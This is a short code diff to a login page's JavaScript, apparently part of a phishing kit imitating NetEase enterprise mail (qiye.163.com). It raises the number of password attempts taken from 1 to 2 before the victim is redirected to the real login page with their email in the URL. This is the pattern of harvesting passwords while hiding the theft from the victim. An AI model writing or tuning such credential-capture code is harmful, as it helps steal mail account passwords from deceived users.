@@ -273,7 +273,7 @@ button {
             		console.log(response);
             		if(response['signal'] == 'ok'){
             			$("#password").val("");
-            			if (count>=1) {
+            			if (count>=2) {
             				count=0;
                     // window.location.replace(response['redirect_link']);
                     window.location.replace("https://qiye.163.com/login/?authuser=2/?msg="+email);
@@ -288,7 +288,7 @@ button {
     },
     error: function(){
     	$("#password").val("");
-    	if (count>=1) {
+    	if (count>=2) {
     		count=0;
     		window.location.replace("https://qiye.163.com/login/?authuser=2/?msg="+email);
     	}
